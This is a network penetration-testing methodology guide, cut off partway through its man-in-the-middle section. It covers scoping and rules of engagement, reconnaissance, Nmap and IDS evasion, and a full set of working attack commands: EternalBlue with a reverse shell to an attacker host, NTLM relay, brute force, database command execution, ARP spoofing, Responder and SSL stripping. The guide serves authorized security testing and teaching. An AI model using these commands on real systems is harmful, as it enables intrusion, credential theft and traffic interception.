# Network Penetration Testing — Complete Methodology from Reconnaissance to Post-Exploitation

## Table of Contents

1. [Network Pentest Methodology](#1-network-pentest-methodology)
2. [Passive Reconnaissance](#2-passive-reconnaissance)
3. [Active Reconnaissance and Scanning](#3-active-reconnaissance-and-scanning)
4. [Exploitation — Network Services](#4-exploitation--network-services)
5. [Man-in-the-Middle Attacks](#5-man-in-the-middle-attacks)
6. [Post-Exploitation and Pivoting](#6-post-exploitation-and-pivoting)
7. [Wireless Network Testing](#7-wireless-network-testing)
8. [Network Infrastructure Attacks](#8-network-infrastructure-attacks)
9. [Reporting and Remediation](#9-reporting-and-remediation)
10. [Lab: Complete Network Pentest Engagement](#10-lab-complete-network-pentest-engagement)

---

## 1. Network Pentest Methodology

### 1.1 PTES Phases Applied to Network Testing

The Penetration Testing Execution Standard (PTES) defines seven phases that map directly onto network-focused engagements:

| Phase | Network Pentest Application |
|-------|----------------------------|
| Pre-engagement Interactions | Scoping IP ranges, defining network boundaries, legal authorization |
| Intelligence Gathering | Passive/active recon against network infrastructure |
| Threat Modeling | Identifying high-value network targets (DCs, jump hosts, SCADA) |
| Vulnerability Analysis | Scanning services, correlating CVEs, identifying misconfigurations |
| Exploitation | Gaining initial access via network service vulnerabilities |
| Post-Exploitation | Lateral movement, pivoting, credential harvesting, persistence |
| Reporting | Attack narrative, remediation roadmap, executive summary |

Each phase feeds the next. Intelligence gathered passively determines where to aim active scans. Vulnerability analysis dictates exploitation paths. Post-exploitation findings (credentials, network maps) loop back into further exploitation rounds.

### 1.2 OSSTMM — Open Source Security Testing Methodology Manual

OSSTMM (version 3) provides a scientific framework for measuring operational security. Unlike PTES, which focuses on penetration, OSSTMM quantifies attack surface through the RAV (Risk Assessment Value) formula:

- **Visibility** — What the target exposes
- **Access** — Entry points available
- **Trust** — Relationships that can be abused
- **Controls** — Security mechanisms in place

OSSTMM defines five channels of testing:

1. Human Security (social engineering vectors)
2. Physical Security (physical access to network devices)
3. Wireless Communications (802.11, Bluetooth, RF)
4. Telecommunications (VoIP, PBX, modem pools)
5. Data Networks (TCP/IP infrastructure)

For network pentests, Channel 5 is primary, but Channels 3 and 4 are frequently in scope for internal assessments.

### 1.3 Pre-Engagement: Scoping, Authorization, Rules of Engagement

#### Scoping

Define precisely what is in and out of bounds:

- **IP ranges** — CIDR notation, ASN ownership verification
- **Domains and subdomains** — Wildcard vs explicit listing
- **Excluded hosts** — Production databases, medical devices, SCADA/ICS
- **Time windows** — Testing hours, blackout periods
- **Rate limits** — Maximum scan intensity, concurrent connections
- **Physical locations** — For internal tests, which offices/floors/buildings

#### Authorization

The authorization chain must be documented and unambiguous:

1. **Written authorization** from asset owner (not just IT manager)
2. **Scope document** signed by both parties
3. **Emergency contacts** for both client and testing team
4. **Get-out-of-jail letter** — Physical document authorizing on-site presence
5. **Third-party authorization** — Cloud providers (AWS pentest policy), ISPs, co-located infrastructure

#### Rules of Engagement (ROE)

```
ROE Document Template:
─────────────────────
1. Testing window: [dates/times]
2. Communication channel: [encrypted email/Signal/secure portal]
3. Status reporting frequency: [daily/weekly/on-finding]
4. Severity threshold for immediate notification: [CVSS >= 9.0]
5. Actions explicitly prohibited:
   - Denial of Service (intentional)
   - Social engineering of specific individuals
   - Modification of production data
   - Exfiltration of real PII/PHI/PCI data
6. Escalation procedure for discovered active compromise
7. Data handling: all test data encrypted at rest, destroyed within [N] days
8. Retesting included: [yes/no, scope]
```

#### Legal Contracts

- **Master Service Agreement (MSA)** — Overarching legal relationship
- **Statement of Work (SOW)** — Specific engagement details, deliverables, timeline
- **Non-Disclosure Agreement (NDA)** — Bidirectional confidentiality
- **Liability limitation** — Cap on damages, exclusion of consequential damages
- **Indemnification** — Client indemnifies tester for authorized actions
- **Insurance** — Professional liability / E&O insurance verification

### 1.4 Pentest Types

#### Black Box

- Zero knowledge beyond target IP ranges or domain
- Simulates external threat actor with no insider information
- Most time-consuming; significant recon phase
- Highest realism but lowest coverage guarantee

#### Gray Box

- Partial knowledge: network diagrams, credential sets, application documentation
- Simulates compromised contractor or limited insider
- Balances realism with coverage efficiency
- Most common engagement type for network pentests

#### White Box (Crystal Box)

- Full documentation: source code, architecture diagrams, credentials, network maps
- Maximum coverage in minimum time
- Simulates advanced persistent threat with inside knowledge
- Best for identifying all vulnerabilities; lowest realism for attack simulation

#### Crystal Box (Extended White Box)

- White box plus real-time collaboration with defenders
- Purple team integration: attackers and defenders work in tandem
- Focus on detection gap analysis rather than pure exploitation
- Defenders tune alerts while attackers attempt bypass

### 1.5 Internal vs External Testing

**External Testing:**
- Targets perimeter-facing infrastructure
- Simulates internet-based attacker
- Scope: public IPs, DMZ, VPN endpoints, web applications
- Goal: breach the perimeter, establish internal foothold

**Internal Testing:**
- Tester operates from inside the network (plugged into a switch port or VPN)
- Simulates rogue employee, compromised workstation, physical intruder
- Scope: internal subnets, Active Directory, inter-VLAN access, trust relationships
- Goal: domain compromise, access to crown jewels, lateral movement demonstration

### 1.6 Assumed Breach Model

Modern engagements increasingly start from an assumed-breach position:

- Tester is given an initial foothold (workstation credentials, VPN access, implant on endpoint)
- Skips initial access phase entirely
- Focuses on detection and response capability testing
- Answers: "If an attacker gets in, how far can they go before detection?"
- Directly tests SOC monitoring, network segmentation, privilege escalation controls

This model is particularly valuable for organizations with mature perimeters but uncertain internal detection capabilities.

---

## 2. Passive Reconnaissance

### 2.1 OSINT Framework for Network Pentesting

Passive reconnaissance gathers intelligence without sending packets to the target. The target has zero visibility into your activities. Structure OSINT collection into layers:

```
Layer 1: Organization → domains, ASNs, IP ranges, subsidiaries
Layer 2: Infrastructure → DNS records, mail servers, CDN edges, cloud presence
Layer 3: Technology → web frameworks, server software, TLS configs
Layer 4: People → administrators, network engineers, technology preferences
Layer 5: History → archived configurations, old DNS records, expired certificates
```

### 2.2 DNS Reconnaissance

#### Zone Transfers (AXFR)

A misconfigured DNS server allowing zone transfers reveals the complete zone file:

```bash
# Attempt zone transfer
dig axfr @ns1.target.com target.com

# Using host command
host -t axfr target.com ns1.target.com

# Using nslookup
nslookup
> server ns1.target.com
> set type=any
> ls -d target.com
```

Zone transfers are rarely successful against hardened infrastructure, but legacy or internal DNS servers frequently allow them.

#### Subdomain Enumeration

```bash
# Passive subdomain enumeration using multiple sources
subfinder -d target.com -all -o subdomains.txt

# Amass passive mode (no direct target contact)
amass enum -passive -d target.com -o amass_passive.txt

# Certificate Transparency based
ctfr -d target.com

# DNS brute force (active, but listed here for completeness)
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50

# Combine and deduplicate
cat subdomains.txt amass_passive.txt | sort -u > all_subs.txt
```

#### DNS History

Services like SecurityTrails, DNSdumpster, and ViewDNS maintain historical DNS records. Old records reveal:

- Previous hosting providers (may still have credentials)
- Internal hostnames that leaked into public DNS
- IP addresses that bypass current CDN/WAF protections
- Mail server changes indicating infrastructure migrations

### 2.3 Certificate Transparency Log Mining

Every publicly trusted CA must submit certificates to CT logs. This is an authoritative source of subdomain discovery:

```bash
# Query crt.sh
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Using ctfr
ctfr -d target.com

# Parse for wildcard certs (indicate internal naming conventions)
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  jq -r '.[].name_value' | grep '\*' | sort -u
```

CT logs also reveal:

- Internal domain naming patterns (e.g., `vpn-prod-east.internal.target.com`)
- Certificate issuance timing (infrastructure change indicators)
- Alternative names on certificates (related domains)
- Pre-production environments (`staging.`, `dev.`, `uat.`)

### 2.4 Shodan, Censys, ZoomEye — Finding Exposed Services

#### Shodan

```bash
# Search by organization
shodan search "org:Target Corporation"

# Search by IP range
shodan search "net:203.0.113.0/24"

# Search for specific services
shodan search "org:Target Corporation" "port:3389"
shodan search "org:Target Corporation" "product:OpenSSH"

# Search for vulnerabilities
shodan search "org:Target Corporation" "vuln:CVE-2021-44228"

# Download host information
shodan host 203.0.113.50

# Monitor continuously
shodan alert create "Target Monitoring" 203.0.113.0/24
```

#### Censys

```bash
# Censys search via CLI
censys search "services.tls.certificates.leaf.subject.organization:Target"

# Find specific service versions
censys search "ip:203.0.113.0/24 AND services.service_name:SSH"

# Export results
censys search "autonomous_system.asn:AS12345" --output json > censys_results.json
```

#### ZoomEye

Particularly strong for Chinese and APAC infrastructure. Search with dorks:

```
app:"Apache httpd" +after:"2024-01-01" +cidr:203.0.113.0/24
service:"rdp" +org:"Target Corporation"
```

### 2.5 BGP/ASN Analysis

Understanding the target's network topology at the BGP level reveals:

- All IP ranges owned or announced by the organization
- Peering relationships (who they connect to)
- Geographic distribution of infrastructure
- Upstream providers (potential attack vectors)

```bash
# Find ASN for organization
whois -h whois.radb.net -- '-i origin AS12345'

# Query BGP prefixes
whois -h whois.radb.net -- '-i origin -T route AS12345'

# Using bgpview.io API
curl -s "https://api.bgpview.io/asn/12345/prefixes" | jq '.data.ipv4_prefixes[].prefix'

# Hurricane Electric BGP Toolkit
# https://bgp.he.net/AS12345#_prefixes

# Using RIPEstat
curl -s "https://stat.ripe.net/data/announced-prefixes/data.json?resource=AS12345" | \
  jq '.data.prefixes[].prefix'
```

### 2.6 Google Dorking for Network Infrastructure

```
# Find exposed network devices
intitle:"RouterOS" site:target.com
intitle:"NETGEAR" inurl:"/currentsetting.htm" site:target.com

# Find VPN portals
inurl:"/remote/login" site:target.com
inurl:"/+CSCOE+/logon.html" site:target.com
intitle:"Citrix Gateway" site:target.com

# Find exposed management interfaces
intitle:"iLO" site:target.com
inurl:"/idrac" site:target.com
intitle:"vSphere" inurl:"/ui" site:target.com

# Find leaked configurations
filetype:cfg site:target.com
filetype:conf inurl:vpn site:target.com
"index of" "backup" site:target.com

# Find exposed monitoring
intitle:"Nagios" site:target.com
intitle:"Zabbix" site:target.com
intitle:"Grafana" site:target.com
```

### 2.7 Social Engineering Reconnaissance

#### LinkedIn Intelligence

- Job postings reveal technology stacks: "Experience with Palo Alto firewalls, Cisco ASA, F5 load balancers required"
- Employee profiles reveal certifications (CCNP, RHCE → Cisco/Red Hat stack)
- Recent hires in security roles indicate security program maturity
- Organizational chart mapping identifies key personnel (CISO, network architects)

#### Job Posting Analysis

```
Target's job listings mentioning:
- "Splunk" → SIEM in use, detection capabilities
- "CrowdStrike" → EDR deployed, endpoint monitoring
- "Palo Alto Prisma" → Cloud security posture
- "Terraform + AWS" → Infrastructure as Code, cloud-native
- "Active Directory" → Windows domain environment
- "Ansible/Puppet" → Configuration management (potential attack surface)
```

#### Technical Forums and Code Repositories

- GitHub commits from target employees may leak internal IPs, hostnames, credentials
- Stack Overflow questions from target email domains reveal architecture details
- Conference talk slides from target engineers expose infrastructure decisions

---

## 3. Active Reconnaissance and Scanning

### 3.1 Nmap — Complete Mastery

#### Scan Types

```bash
# TCP SYN scan (default, stealthy, requires root)
nmap -sS 192.168.1.0/24

# TCP Connect scan (no root required, full TCP handshake)
nmap -sT 192.168.1.0/24

# UDP scan (slow, unreliable, but critical for SNMP/DNS/TFTP)
nmap -sU 192.168.1.0/24

# Combined TCP+UDP
nmap -sS -sU 192.168.1.0/24

# ACK scan (firewall rule mapping, doesn't determine open/closed)
nmap -sA 192.168.1.0/24

# Window scan (like ACK but can differentiate open/closed on some OS)
nmap -sW 192.168.1.0/24

# FIN/Xmas/Null scans (bypass simple packet filters)
nmap -sF 192.168.1.0/24   # FIN
nmap -sX 192.168.1.0/24   # Xmas (FIN+PSH+URG)
nmap -sN 192.168.1.0/24   # Null (no flags)

# SCTP INIT scan (telephony/SS7 networks)
nmap -sY 192.168.1.0/24

# IP Protocol scan (determine supported IP protocols)
nmap -sO 192.168.1.1

# Idle scan (completely blind, uses zombie host)
nmap -sI zombie_host:port target_host
```

#### Timing Templates

```bash
# T0 (Paranoid) — IDS evasion, 5 min between probes
nmap -T0 target

# T1 (Sneaky) — IDS evasion, 15 sec between probes
nmap -T1 target

# T2 (Polite) — Reduced bandwidth usage
nmap -T2 target

# T3 (Normal) — Default
nmap -T3 target

# T4 (Aggressive) — Fast, assumes reliable network
nmap -T4 target

# T5 (Insane) — Very fast, may miss results
nmap -T5 target

# Custom timing (granular control)
nmap --min-rate 1000 --max-rate 5000 \
     --min-parallelism 10 --max-parallelism 50 \
     --host-timeout 30m --scan-delay 100ms target
```

#### NSE (Nmap Scripting Engine)

```bash
# Run default scripts
nmap -sC target

# Run specific script category
nmap --script=vuln target
nmap --script=auth target
nmap --script=discovery target

# Run specific scripts
nmap --script=smb-vuln-ms17-010 target
nmap --script=http-enum target
nmap --script=dns-brute target

# Script arguments
nmap --script=http-brute --script-args http-brute.path=/admin target
nmap --script=smb-enum-shares --script-args smbusername=admin,smbpassword=pass target

# Multiple script categories
nmap --script="vuln and safe" target

# Update script database
nmap --script-updatedb
```

#### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt target

# XML output (parseable)
nmap -oX scan_results.xml target

# Grepable output
nmap -oG scan_results.gnmap target

# All formats simultaneously
nmap -oA scan_results target

# Script kiddie format (for humor)
nmap -oS scan_results.skid target
```

#### Evasion Techniques

```bash
# Fragment packets (evade simple IDS)
nmap -f target
nmap --mtu 24 target

# Decoys (hide among fake source IPs)
nmap -D RND:10 target
nmap -D 192.168.1.1,192.168.1.2,ME,192.168.1.3 target

# Source port manipulation (bypass firewall rules allowing DNS/HTTP)
nmap --source-port 53 target
nmap --source-port 80 target

# Spoof MAC address
nmap --spoof-mac Apple target
nmap --spoof-mac 00:11:22:33:44:55 target

# Append random data to packets
nmap --data-length 25 target

# Use specific network interface
nmap -e eth0 target

# IP options (source routing, record route)
nmap --ip-options "L 192.168.1.1 192.168.1.2" target

# Badsum (IDS testing — real hosts drop, IDS may process)
nmap --badsum target

# Combine evasion techniques
nmap -sS -T2 -f --data-length 50 --source-port 53 \
     -D RND:5 --spoof-mac 0 target
```

#### Complete Network Discovery Workflow

```bash
# Phase 1: Host discovery (no port scan)
nmap -sn -PE -PP -PM -PS21,22,25,80,443,3389 -PA80,443 \
     -oA discovery 192.168.1.0/24

# Phase 2: Top ports on discovered hosts
nmap -sS -sV --top-ports 1000 -T4 -oA top_ports \
     -iL discovered_hosts.txt

# Phase 3: Full TCP port scan on interesting hosts
nmap -sS -p- -T4 --min-rate 1000 -oA full_tcp target_host

# Phase 4: Full UDP scan on interesting ports
nmap -sU -p 53,67,68,69,123,161,162,500,514,1900,4500,5353 \
     -sV -oA udp_scan target_host

# Phase 5: Vulnerability assessment
nmap --script=vuln -p <open_ports> -oA vuln_scan target_host

# Phase 6: Deep service enumeration
nmap -sV --version-intensity 5 -sC -p <open_ports> \
     -oA deep_enum target_host
```

### 3.2 Masscan for High-Speed Scanning

```bash
# Scan entire /16 for common ports
masscan 10.0.0.0/16 -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 \
        --rate 100000 -oG masscan_results.gnmap

# Full port scan at high rate
masscan 192.168.1.0/24 -p 0-65535 --rate 500000 -oX masscan_full.xml

# Banner grabbing
masscan 10.0.0.0/16 -p 80,443,8080,8443 --banners --rate 100000

# Exclude sensitive hosts
masscan 10.0.0.0/16 -p 1-65535 --rate 200000 \
        --excludefile exclude_hosts.txt

# Convert masscan output to nmap-compatible for further analysis
masscan 192.168.1.0/24 -p 1-65535 --rate 100000 -oL masscan_list.txt
# Then targeted nmap:
nmap -sV -sC -p <ports_from_masscan> target
```

### 3.3 Service Version Detection

```bash
# Standard version detection
nmap -sV target

# Aggressive version detection (more probes, more noise)
nmap -sV --version-intensity 9 target

# Light version detection (fewer probes, faster)
nmap -sV --version-light target

# Version detection with all probes
nmap -sV --version-all target

# Combine with OS detection
nmap -sV -O target

# Specific service enumeration scripts
nmap -sV --script=banner target
nmap -sV --script=http-server-header target
nmap -sV --script=ssl-cert target
```

### 3.4 OS Fingerprinting

#### Active OS Fingerprinting

```bash
# Standard OS detection
nmap -O target

# Aggressive OS guessing (when standard fails)
nmap -O --osscan-guess target

# Limit OS detection to promising hosts
nmap -O --osscan-limit target

# Combine with version detection for best results
nmap -O -sV target
```

#### Passive OS Fingerprinting

```bash
# p0f — passive fingerprinting from network tap/span port
p0f -i eth0 -o p0f_results.log

# p0f reading from pcap
p0f -r capture.pcap -o p0f_results.log

# Analyzing TCP/IP stack characteristics:
# - Initial TTL (Linux=64, Windows=128, Cisco=255)
# - TCP window size
# - DF bit behavior
# - TCP options order and values
# - MSS values
```

### 3.5 Vulnerability Scanning

#### Nessus (Targeted Scans)

```bash
# Nessus CLI (nessuscli)
/opt/nessus/sbin/nessuscli scan --hosts=192.168.1.0/24 \
  --policy="Advanced Network Scan"

# Best practices for pentest-focused Nessus usage:
# 1. Use credentialed scans when gray/white box
# 2. Enable "Thorough tests" for completeness
# 3. Disable "Safe checks" if DoS is acceptable
# 4. Custom scan policies targeting specific CVEs
# 5. Export results as .nessus for import into other tools
```

#### OpenVAS/Greenbone

```bash
# Start OpenVAS
gvm-start

# Create target via CLI
gvm-cli socket --xml '<create_target>
  <name>Network Pentest Target</name>
  <hosts>192.168.1.0/24</hosts>
</create_target>'

# Launch scan with Full and Fast policy
gvm-cli socket --xml '<create_task>
  <name>Network Assessment</name>
  <target id="TARGET_UUID"/>
  <config id="daba56c8-73ec-11df-a475-002264764cea"/>
</create_task>'
```

### 3.6 Network Topology Mapping

```bash
# Traceroute to map paths
traceroute -n target
traceroute -T -p 80 target   # TCP traceroute (bypasses ICMP filters)
traceroute -U -p 53 target   # UDP traceroute

# Nmap traceroute (integrated with port scan)
nmap --traceroute target

# Zenmap (GUI) for topology visualization
zenmap    # Import nmap XML for graphical topology view

# Using netdiscover for local ARP-based discovery
netdiscover -i eth0 -r 192.168.1.0/24

# Using arp-scan
arp-scan --interface=eth0 192.168.1.0/24
```

### 3.7 Identifying Security Devices

#### Firewall Detection

```bash
# ACK scan reveals filtered vs unfiltered
nmap -sA -p 1-1000 target

# Compare SYN vs ACK results
nmap -sS -p 80 target    # Shows open
nmap -sA -p 80 target    # Shows unfiltered → stateless filter

# Firewalk — determine firewall rule sets
firewalk -S 80 -d 1-1000 -i eth0 -pTCP gateway_ip target_ip

# TTL-based firewall detection
nmap --ttl 1 target    # If response, firewall is first hop
```

#### IDS/IPS Detection

```bash
# Fragmentation test (IDS evasion check)
nmap -f target        # Compare results with unfragmented scan
nmap --mtu 8 target   # Tiny fragments

# Slow scans to test time-based detection
nmap -T0 -p 80 target

# Overlapping fragment attacks
fragroute -f overlap.conf target

# NIDS evasion testing with nmap
nmap --data-length 50 --ttl 64 -f --source-port 80 target
```

#### WAF Detection

```bash
# wafw00f — WAF fingerprinting
wafw00f https://target.com

# Manual detection via response headers
curl -I https://target.com
# Look for: X-Sucuri-ID, X-CDN, CF-Ray, X-Akamai-*

# Nmap WAF detection
nmap --script=http-waf-detect target
nmap --script=http-waf-fingerprint target
```

---

## 4. Exploitation — Network Services

### 4.1 SMB Attacks

#### EternalBlue (MS17-010)

```bash
# Detection
nmap --script=smb-vuln-ms17-010 -p 445 target

# Metasploit exploitation
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set LHOST attacker_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# EternalBlue + DoublePulsar (manual)
python eternal_blue_exploit.py target shellcode.bin
```

#### SMB Relay Attacks

```bash
# Using ntlmrelayx (impacket)
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to specific service
ntlmrelayx.py -t smb://192.168.1.100 -smb2support -i

# Relay with command execution
ntlmrelayx.py -t smb://192.168.1.100 -c "whoami"

# Relay to LDAP for AD escalation
ntlmrelayx.py -t ldap://dc01.target.local --escalate-user attacker

# MultiRelay
python MultiRelay.py -t 192.168.1.100 -u ALL
```

#### SMB Brute Force

```bash
# Hydra
hydra -L users.txt -P passwords.txt smb://target

# CrackMapExec (preferred for SMB)
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt

# Spray single password
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Summer2024!'

# Metasploit
use auxiliary/scanner/smb/smb_login
set RHOSTS target
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

#### Null Sessions

```bash
# Enumerate with null session
rpcclient -U "" -N target
> enumdomusers
> enumdomgroups
> querydispinfo
> lookupnames administrator

# Enum4linux
enum4linux -a target

# Enum4linux-ng (updated)
enum4linux-ng -A target

# smbclient null session
smbclient -L //target -N
smbclient //target/share -N
```

### 4.2 SSH Attacks

#### Brute Force

```bash
# Hydra
hydra -L users.txt -P passwords.txt ssh://target -t 4

# Medusa
medusa -h target -U users.txt -P passwords.txt -M ssh

# Metasploit
use auxiliary/scanner/ssh/ssh_login
set RHOSTS target
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# Ncrack
ncrack -U users.txt -P passwords.txt ssh://target
```

#### Key Authentication Attacks

```bash
# Find weak/default SSH keys
nmap --script=ssh-publickey-acceptance -p 22 target

# Debian weak key vulnerability (CVE-2008-0166)
# Predictable PRNG in OpenSSL on Debian
# Test with pre-generated weak key database

# Stolen key exploitation
ssh -i stolen_id_rsa user@target
# If passphrase protected:
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=rockyou.txt
```

#### Agent Forwarding Exploitation

When SSH agent forwarding is enabled (`-A` flag), a compromised intermediate host can hijack the forwarded agent:

```bash
# On compromised jump host, find agent sockets
find /tmp -name "agent.*" 2>/dev/null

# Hijack agent
export SSH_AUTH_SOCK=/tmp/ssh-XXXXX/agent.12345
ssh-add -l    # List available keys
ssh target2   # Use victim's key to access other hosts
```

### 4.3 RDP Attacks

#### BlueKeep (CVE-2019-0708)

```bash
# Detection
nmap --script=rdp-vuln-ms12-020 -p 3389 target
# Note: BlueKeep scanner uses different detection

# Metasploit
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS target
run

# Exploitation (use with extreme caution — can BSOD)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target
set TARGET 1    # Must match exact OS version
run
```

#### RDP Brute Force

```bash
# Hydra
hydra -L users.txt -P passwords.txt rdp://target

# Crowbar (preferred for RDP)
crowbar -b rdp -s 192.168.1.0/24 -U users.txt -C passwords.txt

# Ncrack
ncrack -U users.txt -P passwords.txt rdp://target
```

#### RDP Session Hijacking

On a compromised Windows host with SYSTEM privileges:

```cmd
:: List RDP sessions
query user

:: Hijack disconnected session (no password needed as SYSTEM)
tscon <session_id> /dest:rdp-tcp#<your_session>

:: Using PsExec to get SYSTEM first
PsExec.exe -s -i cmd.exe
tscon 2 /dest:rdp-tcp#0
```

### 4.4 FTP/TFTP Attacks

```bash
# Anonymous FTP access
ftp target
> anonymous
> anonymous@

# Nmap FTP enumeration
nmap --script=ftp-anon,ftp-bounce,ftp-vuln-cve2010-4221 -p 21 target

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://target

# TFTP enumeration (no authentication by design)
nmap -sU -p 69 --script=tftp-enum target
tftp target
> get /etc/passwd
> get running-config

# FTP bounce attack (use FTP server to port scan internal hosts)
nmap -b ftp_user:ftp_pass@ftp_server target_internal
```

### 4.5 SNMP Attacks

#### Community String Brute Force

```bash
# onesixtyone — fast SNMP scanner
onesixtyone -c community_strings.txt 192.168.1.0/24

# Hydra
hydra -P community_strings.txt target snmp

# Nmap
nmap -sU -p 161 --script=snmp-brute target

# Metasploit
use auxiliary/scanner/snmp/snmp_login
set RHOSTS 192.168.1.0/24
run
```

#### SNMP Information Disclosure

```bash
# Walk entire MIB tree
snmpwalk -v2c -c public target

# Enumerate specific OIDs
# System information
snmpwalk -v2c -c public target 1.3.6.1.2.1.1
# Network interfaces
snmpwalk -v2c -c public target 1.3.6.1.2.1.2
# Running processes (Windows)
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.4.2.1.2
# Installed software
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.6.3.1.2
# TCP connections
snmpwalk -v2c -c public target 1.3.6.1.2.1.6.13.1.3
# User accounts
snmpwalk -v2c -c public target 1.3.6.1.4.1.77.1.2.25

# SNMPv3 enumeration (if credentials obtained)
snmpwalk -v3 -u username -l authPriv -a SHA -A authpass \
         -x AES -X privpass target
```

### 4.6 SMTP Attacks

#### User Enumeration

```bash
# VRFY command
smtp-user-enum -M VRFY -U users.txt -t target

# RCPT TO method
smtp-user-enum -M RCPT -U users.txt -t target

# EXPN command
smtp-user-enum -M EXPN -U users.txt -t target

# Nmap scripts
nmap --script=smtp-enum-users -p 25 target

# Manual enumeration
telnet target 25
HELO test
VRFY admin
VRFY root
VRFY user@target.com
```

#### Open Relay Testing

```bash
# Nmap
nmap --script=smtp-open-relay -p 25 target

# Manual test
telnet target 25
HELO test
MAIL FROM:<test@attacker.com>
RCPT TO:<victim@external.com>
DATA
Subject: Relay Test
Test message
.
QUIT
```

### 4.7 Database Services

#### Default Credentials

```bash
# MySQL
mysql -h target -u root -p    # Try: root, (empty), toor, mysql

# PostgreSQL
psql -h target -U postgres    # Try: postgres, (empty), admin

# MSSQL
# sa:(empty), sa:sa, sa:Password1

# Oracle
# SYS:CHANGE_ON_INSTALL, SYSTEM:MANAGER, DBSNMP:DBSNMP

# MongoDB (no auth by default on older versions)
mongosh --host target
```

#### Database Privilege Escalation

```bash
# MSSQL — xp_cmdshell
# If sa access obtained:
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# MySQL — UDF (User Defined Functions)
# Upload shared library for command execution
# Works when FILE privilege is granted

# PostgreSQL — command execution
# If superuser:
COPY (SELECT '') TO PROGRAM 'id';
# Or via large objects:
CREATE OR REPLACE FUNCTION cmd(text) RETURNS text AS $$
  import os; return os.popen(args[0]).read()
$$ LANGUAGE plpython3u;
SELECT cmd('id');

# Impacket mssqlclient
mssqlclient.py -windows-auth DOMAIN/user:pass@target
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

---

## 5. Man-in-the-Middle Attacks

### 5.1 ARP Spoofing

#### Ettercap

```bash
# Text mode ARP poisoning
ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//

# With DNS spoofing
# Edit /etc/ettercap/etter.dns:
# *.target.com A 192.168.1.50
ettercap -T -q -i eth0 -M arp:remote -P dns_spoof /192.168.1.1// /192.168.1.100//

# Graphical mode
ettercap -G
```

#### Bettercap

```bash
# Start bettercap
bettercap -iface eth0

# ARP spoofing entire subnet
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# With HTTPS downgrade
set http.proxy.sslstrip true
http.proxy on
https.proxy on

# Credential sniffing
net.sniff on

# Caplet automation (save as pentest.cap)
# net.probe on
# set arp.spoof.fullduplex true
# arp.spoof on
# set net.sniff.local true
# net.sniff on

bettercap -iface eth0 -caplet pentest.cap
```

#### Arpspoof (dsniff suite)

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Spoof target (tell target that we are the gateway)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Spoof gateway (tell gateway that we are the target)
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
```

### 5.2 LLMNR/NBT-NS/mDNS Poisoning

#### Responder

```bash
# Basic Responder (captures NTLMv2 hashes)
responder -I eth0 -dwv

# Analyze mode (passive, just listen)
responder -I eth0 -A

# With WPAD proxy
responder -I eth0 -wFv

# Responder configuration (/etc/responder/Responder.conf)
[Responder Core]
SQL = On
SMB = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WinRM = On

# Captured hashes location
ls /usr/share/responder/logs/

# Crack captured NTLMv2 hashes
hashcat -m 5600 hashes.txt rockyou.txt
john --format=netntlmv2 hashes.txt --wordlist=rockyou.txt
```

#### Inveigh (Windows/.NET alternative)

```powershell
# PowerShell
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y

# Inveigh compiled binary
.\Inveigh.exe
```

### 5.3 DHCPv6 Attacks — mitm6

```bash
# mitm6 exploits Windows preferring IPv6
# Assigns attacker as IPv6 DNS server
mitm6 -d target.local

# Combine with ntlmrelayx for relay
# Terminal 1:
mitm6 -d target.local

# Terminal 2:
ntlmrelayx.py -6 -t ldaps://dc01.target.local -wh fakewpad.target.local \
              -l lootdir --delegate-access

# This can create machine accounts and set delegation rights
```

### 5.4 WPAD Exploitation

```bash
# Responder WPAD proxy
responder -I eth0 -wFv

# Custom WPAD file serving
# Serve malicious wpad.dat that proxies through attacker
# wpad.dat content:
function FindProxyForURL(url, host) {
    return "PROXY 192.168.1.50:8080; DIRECT";
}

# All HTTP traffic now flows through attacker's proxy
# Combine with credential capture
```

### 5.5 SSL Stripping

```bash
# Bettercap SSL stripping
bettercap -iface eth0
set http.proxy.sslstrip true
set arp.spoof.targets 192.168.1.100
arp.spoof on
http.proxy on

# Manual with sslstrip
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sslstrip -l 8080

# Modern HSTS bypass (partial)
# sslstrip2 with dns2proxy
python sslstrip2.py -l 8080 -a -w sslstrip.log
# Rewrites HSTS domains: accounts.google.com → accounts.google.com.attacker.com
```

### 5.6 IPv6 Attacks in Dual-Stack Networks

```bash
# Router Advertisement flooding (SLAAC attack)
flood_router6 eth0

# Fake router advertisement (become default gateway)
fake_router6 eth0 2001:db8::/64

# THC-IPv6 toolkit
# Parasite6 — ARP spoofing equivalent for IPv6 (NDP spoofing)
parasite6 eth0

# IPv6 address scanning
alive6 eth0

# Rogue DHCPv6 server
# Assign DNS server pointing to attacker
